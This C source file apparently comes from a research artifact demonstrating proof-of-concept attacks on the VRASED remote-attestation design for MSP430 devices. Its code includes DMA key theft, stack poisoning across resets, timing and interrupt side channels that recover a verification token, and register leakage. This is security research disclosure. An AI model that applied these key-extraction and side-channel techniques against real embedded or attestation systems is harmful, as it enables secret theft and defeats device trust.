#include <string.h>
#include "vrased-config.h"

/**
 * Attack authors: our comments are added as block comments, the original
 * VRASED comments are preserved as line comments.
 * */

/*********** TRUSTED VRASED WRAPPER CODE (inside SW-Att) ***********/

#define ATTEST_DATA_ADDR 0xE000
#define ATTEST_SIZE 0x20

/* Fields for VRASED_A */
#define VRF_AUTH 0x0250

extern void
hmac(
  uint8_t *mac,
  uint8_t *key,
  uint32_t keylen,
  uint8_t *data,
  uint32_t datalen
);

#if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6

/**
 * Performs constant time comparison between to buffers
 * Returns 0 if the first `n` bytes of the two buffers are equal, -1 otherwise
 *
 * NOTE: Force-inline function so it becomes part of SW-Att's ROM code section.
 *
 * NOTE: Function adapted from NaCL's libsodium, re-use allowed under ISC license.
 */
static inline __attribute__((always_inline))
int cst_memeq(const unsigned char *x_, const unsigned char *y_,
                                    const unsigned int n)
{
    const volatile unsigned char *volatile x =
        (const volatile unsigned char *volatile) x_;
    const volatile unsigned char *volatile y =
        (const volatile unsigned char *volatile) y_;
    volatile unsigned int d = 0U;
    unsigned int i;

    for (i = 0; i < n; i++) {
        d |= x[i] ^ y[i];
    }

    return (1 & ((d - 1) >> 8)) - 1;
}

/**
 * VRASED_A: authenticated attestation
 * We based the code on the RATA implementation, which only differs from the code
 * in the appendix of VRASED in one place: it uses the MAC region to pass the challenge
 * (which the base VRASED also does).
 * */

__attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry()
{
  uint8_t key[KEY_SIZE] = {0};
  uint8_t verification[MAC_SIZE] = {0};

  /* NOTE: CTR_ADDR and MAC_ADDR are not secret (i.e., publicly readible),
   * so we can simply use standard (non-cst time) memcmp. */
  if (memcmp((uint8_t*) MAC_ADDR, (uint8_t*) CTR_ADDR, CTR_SIZE) > 0)
  {
    memcpy(key, (uint8_t*) KEY_ADDR, KEY_SIZE);
    hmac((uint8_t*) verification, (uint8_t*) key, (uint32_t) KEY_SIZE, (uint8_t*)MAC_ADDR, (uint32_t) MAC_SIZE);

    // Verifier Authentication before calling HMAC
    /* NOTE: use cst-time memcmp for the secret (key-dependent) verification token */
    if (cst_memeq((uint8_t*) VRF_AUTH, verification, MAC_SIZE) == 0)
    {
      memcpy((uint8_t*) CTR_ADDR, (uint8_t*) MAC_ADDR, CTR_SIZE);

      // Key derivation function for rest of the computation of HMAC
      hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) KEY_SIZE, (uint8_t*) verification, (uint32_t) MAC_SIZE);

      // HMAC on the attestation region. Stores the result in MAC_ADDR itself.
      hmac((uint8_t*) MAC_ADDR, (uint8_t*) key, (uint32_t) MAC_SIZE, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);
    }
  }

  // setting the return addr:
  __asm__ volatile("mov    #0x0300,   r6" "\n\t");
  __asm__ volatile("mov    @(r6),     r6" "\n\t");

  // postamble
  __asm__ volatile("add     #70,    r1" "\n\t");
  __asm__ volatile( "br      #__mac_leave" "\n\t");
}

#else

__attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() {

    //Save application stack pointer.
    //Allocate key buffer.
    #if __ATTACK == 3
    /**
     * NOTE: we explicitly remove the (redundant) zero-initialization here, as
     * it may generate an early reset when writing out of the MAC region.
     * However, this is only needed when the compiler does not already optimize
     * away the redundant zero-intialization when noticing the explicit memcpy
     * initialization below (e.g., as validated with clang-msp430; see also the
     * ../../swatt-init directory).
     * */
    uint8_t key[KEY_SIZE];
    #else
    uint8_t key[KEY_SIZE] = {0};
    #endif

    //Copy the key from KEY_ADDR to the key buffer.
    memcpy(key, (uint8_t*)KEY_ADDR, KEY_SIZE);
    hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) KEY_SIZE, (uint8_t*) MAC_ADDR, (uint32_t) MAC_SIZE);
    // Uses the result in the key buffer to compute HMAC.
    // Stores the result in HMAC ADDR.
    hmac((uint8_t*) (MAC_ADDR), (uint8_t*) key, (uint32_t) MAC_SIZE, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);

	//return;

    // setting the return addr:
    __asm__ volatile("mov    #0x0300,   r6" "\n\t");
    __asm__ volatile("mov    @(r6),     r6" "\n\t");

    // postamble
    __asm__ volatile("add     #70,    r1" "\n\t");
    __asm__ volatile( "br      #__mac_leave" "\n\t");
}

#endif

__attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMAC_SHA2_256_hmac_exit() {
    __asm__ volatile("br   r6" "\n\t");
}

/*********** UNTRUSTED VRASED WRAPPER CODE (outside SW-Att) ***********/

#include <stdio.h>
#include "hardware.h"

#define DMA_ATTACKER_STEAL_KEY          0x0070
#define DMA_ATTACKER_PERSISTENT_FLAG    0x0072
#define DMA_ATTACKER_RESET_CNT          0x0074
#define DMA_ATTACKER_COUNTDOWN          0x0076
#define DMA_ATTACKER_DELAYED            0x0078

/**
 * MAC region: [0x0230, 0x250[
 * NOTE: leave 12 bytes for local variables of memcpy function
 * */
#define STACK_POISON_ADDRESS            (MAC_ADDR + KEY_SIZE + 12)

/* stringify macro parameter a */
#define __s__(a)                        #a
#define _s_(a)                          __s__(a)

void my_memset(uint8_t* ptr, int len, uint8_t val) {
  int i=0;
  for(i=0; i<len; i++) ptr[i] = val;
}

void my_memcpy(uint8_t* dst, uint8_t* src, int size) {
  int i=0;
  for(i=0; i<size; i++) dst[i] = src[i];
}

void dump_buf(char *name, uint8_t *buf, int start, int end)
{
    printf("%s[%d:%d]: ", name, start, end-1);

    for (int i = start; i < end; i++)
        printf("%02x", *(buf+i));
    printf("\n");
}

/* defined in dump_regs.S */
void dump_regs_before(void);
void dump_regs_after(void);

struct __attribute__((__packed__)) regs_dump
{
    uint16_t r1;
    uint16_t r2;
    uint16_t r3;
    uint16_t r4;
    uint16_t r5;
    uint16_t r6;
    uint16_t r7;
    uint16_t r8;
    uint16_t r9;
    uint16_t r10;
    uint16_t r11;
    uint16_t r12;
    uint16_t r13;
    uint16_t r14;
    uint16_t r15;
};
struct regs_dump regs_before, regs_after;

void print_and_compare_regs(char *str1, struct regs_dump *regs_struct1,
                            char *str2, struct regs_dump *regs_struct2)
{
    uint16_t *regs1 = (uint16_t*) regs_struct1;
    uint16_t *regs2 = (uint16_t*) regs_struct2;
    uint16_t reg1, reg2;
    int i, eq, leak = 0;

    printf("dumping registers %s/%s:\n", str1, str2);
    printf("--------------------------------------------------------\n");
    for (i = 0; i < 15; i++)
    {
        reg1 = *(regs1+i);
        reg2 = *(regs2+i);
        eq = (reg1 == reg2);
        if (reg2 && !eq)
            leak++;

        printf("\tR%-2d = 0x%04x / 0x%04x %s (MSPGCC ABI %s-save)\n",
            i+1, reg1, reg2, eq ? " " : "*", i < 11 ? "callee" : "caller");
    }
    printf("--------------------------------------------------------\n");

    if (leak)
        printf("%d non-zero registers leaked!\n", leak);
    else
        printf("PoC failed\n");
}

/**
 * Demonstrate how VRASED attackers with arbitrary untrusted code execution can
 * detect and persist state across resets (as used in some of the attacks below).
 *
 * NOTE: the approach below uses a simple .noinit global variable, which, once
 * initialized to a known magic value, will survive across resets (i.e., it
 * will not be zeroed by the reset vector code; its value is unspecified in
 * real RAM and will very likely not be exactly the magic marker 0xdead).
 *
 * Alternatively, when the attacker controls a custom DMA peripheral, a reset
 * can also be detected by polling the `DMA_ATTACKER_PERSISTENT_FLAG` adress of
 * our custom DMA attacker peripheral.
 */
int __attribute__ ((section (".noinit"))) attack_iteration;
int __attribute__ ((section (".noinit"))) swatt_timings[3];
int __attribute__ ((section (".noinit"))) reset_marker;
int __attribute__ ((section (".noinit"))) have_reset;

void VRASED (uint8_t *challenge, uint8_t *response) {
    if (reset_marker == 0xdead)
        have_reset++;
    else {
        reset_marker = 0xdead;
        attack_iteration = 0;
        have_reset = 0;
    }

    printf("Attack: %d; have_reset: %d\n", __ATTACK, have_reset);

    #if __ATTACK == 1
      if (!have_reset) {
        __asm__ volatile(
            "mov #1, &" _s_(DMA_ATTACKER_STEAL_KEY) "\n"
            ".REPT 64 \n"
            "  nop \n"
            ".ENDR \n"
        );
      } else {
        printf("PoC failed\n");
        return;
      }

      dump_buf("leak", (uint8_t*) MAC_ADDR, 0, KEY_SIZE);
      return;
    #endif

    #if __ATTACK == 2
      if (!have_reset)
        dump_buf("leak", (uint8_t*) KEY_ADDR, 31, KEY_SIZE);
      else
        printf("PoC failed\n");
      return;
    #endif

    #if __ATTACK == 3
      if (have_reset) {
        dump_buf("leak", (uint8_t*) (STACK_POISON_ADDRESS - KEY_SIZE), 0, 22);
        return;
      } else {
        printf("First run\n");
      }
    #endif

    #if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6
      //if (!have_reset)
      //  dump_buf("ctr", (uint8_t*) CTR_ADDR, 0, CTR_SIZE);

      my_memset((uint8_t*) VRF_AUTH, MAC_SIZE, 0);
      uint8_t * verification = (uint8_t*) VRF_AUTH;

      /* NOTE: Brute-forcing the entire verification token is possible in
       * linear time, but will still take long in the iverilog simulation.
       * Hence, our PoC only demonstrates timing leakage for the first two
       * bytes with demonstration guesses chosen as follows.
       *
       * Correct verification token is:
       * 444eb44a4a018344b057451667ac6e8414f7736c329edd7fff8d467cb1f5c5d3
       */
    attack4:
      switch (attack_iteration) {
      case 0:
        verification[0] = 0x42;
        verification[1] = 0x42;
        break;
      case 1:
        verification[0] = 0x44;
        verification[1] = 0x42;
        break;
      case 2:
        verification[0] = 0x44;
        verification[1] = 0x4e;
        break;
      }
      attack_iteration++;
    #endif

    #if __ATTACK == 4
      /* setting up the clock for time measurement */
      TACTL = TACLR | MC_2 | TASSEL_2;
    #endif

    #if __ATTACK == 5
      if (have_reset > 0 && have_reset <= 2) {
        uint16_t delay = *((uint16_t*) DMA_ATTACKER_RESET_CNT);
        printf("Interrupt delay: %u\n", delay);

        /**
         * In case the delay is 14486, it means the interrupt was served in one
         * cycle: it hit the `mov.b` instruction (pc: b0b6) that is already
         * outside of the comparison loop in `memcmp`.
         * In case the delay is one cycle longer, that indicates interrupting
         * during the `jmp` instruction (pc: b0be) that jumps back to the start
         * of the comparison loop in `memcmp`, indicating that the first byte
         * was correctly guessed.
         * */
        if (delay == 14486) {
          if (have_reset == 1) {
            printf("First byte not guessed, retrying\n");
          } else {
            printf("PoC failed\n");
            return;
          }
        } else {
          printf("First byte guessed, finishing\n");
          return;
        }
      } else {
        printf("First run\n");
      }

      /* setting up the clock for interrupting */
      TACCR0 = 26385;
      *((uint16_t*) DMA_ATTACKER_RESET_CNT) = 0;
      TACTL = TACLR | MC_1 | TASSEL_2 | ID_3 | TAIE;
    #endif

    #if __ATTACK == 6
      if (have_reset > 0 && have_reset <= 2) {
        uint16_t delayed = *((uint16_t*) DMA_ATTACKER_DELAYED);
        printf("DMA delayed: %s\n", delayed ? "Yes" : "No");

        /**
         * Similar to above, we aim the DMA data memory request to the same
         * cycle when the `memcmp` loads the byte to be compared from data
         * memory.
         * If the contention happens, that means the next byte was fetched,
         * indicating that the comparison for the current byte succeeded, the
         * guessed value was correct.
         * */
        if ((have_reset == 1) && !delayed) {
            printf("First byte not guessed, retrying\n");
        } else if ((have_reset == 2) && delayed) {
            printf("First byte guessed, finishing\n");
            return;
        } else {
            printf("PoC failed\n");
            return;
        }
      } else {
        printf("First run\n");
      }

      /* setting up the timed dma request */
      *((uint16_t*) DMA_ATTACKER_COUNTDOWN) = 26387;
      __asm__ volatile("nop\n"); /* skipping one cycle for precise timing */
    #endif

    //Copy input challenge to MAC_ADDR:
    my_memcpy ( (uint8_t*)MAC_ADDR, challenge, MAC_SIZE);

    #if __ATTACK == 5
    /* enable interrupts */
    __eint();
    #else
    //Disable interrupts:
    __dint();
    #endif

    // Save current value of r5 and r6:
    __asm__ volatile("push    r5" "\n\t");
    __asm__ volatile("push    r6" "\n\t");

    // Write return address of Hacl_HMAC_SHA2_256_hmac_entry
    // to RAM:
    __asm__ volatile("mov    #cont_vrased,   r6" "\n\t");
    __asm__ volatile("mov    #0x0300,   r5" "\n\t");
    __asm__ volatile("mov    r0,        @(r5)" "\n\t");
    __asm__ volatile("mov    r6,        @(r5)" "\n\t");

    // Save the original value of the Stack Pointer (R1):
    __asm__ volatile("mov    r1,    r5" "\n\t");

    // Set the stack pointer to the base of the exclusive stack:
    #if __ATTACK == 3
      __asm__ volatile("mov #" _s_(STACK_POISON_ADDRESS) ",     r1" "\n\t");
    #else
      __asm__ volatile("mov    #0x1000,     r1" "\n\t");
    #endif

    #if __ATTACK == 7
      __asm__ volatile("br #dump_regs_before\n\t");
      /* NOTE: we use an explicit return label and branch to asm code as we can't
       * use the stack call/return at this point and don't want to pollute regs.
       */
      __asm__ volatile(".global cont_dump_regs_before\n\t");
      __asm__ volatile("cont_dump_regs_before: \n\t");
    #endif

    // Call SW-Att:
    __asm__ volatile ("nop\n\t"); /* timing alignment */
    __asm__ volatile ("br #Hacl_HMAC_SHA2_256_hmac_entry\n\t");
    __asm__ volatile("cont_vrased: \n\t");

    #if __ATTACK == 7
      __asm__ volatile("br #dump_regs_after\n\t");
      __asm__ volatile(".global cont_dump_regs_after\n\t");
      __asm__ volatile("cont_dump_regs_after: \n\t");
    #endif

    // Copy retrieve the original stack pointer value:
    __asm__ volatile("mov    r5,    r1" "\n\t");

    // Restore original r5,r6 values:
    __asm__ volatile("pop   r6" "\n\t");
    __asm__ volatile("pop   r5" "\n\t");

    // Enable interrupts:
    __eint();

    #if __ATTACK == 3
      /* Should have reset and never come here */
      printf("PoC failed\n");
      return;
    #endif

    #if __ATTACK == 4
      uint16_t tar = TAR;
      swatt_timings[attack_iteration-1] = tar;
      printf("Attack iteration %d, execution took %d cycles (%d bytes correct)\n",
        attack_iteration,
        tar,
        (tar - 14511) / 13); /* Cycle count: 14511 + (guessed_byte_count * 13) */
      if (attack_iteration <= 2) {
        goto attack4;
      }
      else if ((swatt_timings[0] == swatt_timings[1]) ||
               (swatt_timings[1] == swatt_timings[2]) ||
               (swatt_timings[0] == swatt_timings[2])) {
        printf("PoC failed\n");
        return;
      }
    #endif

    #if __ATTACK == 7
        print_and_compare_regs("before", &regs_before, "after", &regs_after);
    #endif

    // Return the HMAC value to the application:
    my_memcpy(response, (uint8_t*)MAC_ADDR, MAC_SIZE);
}
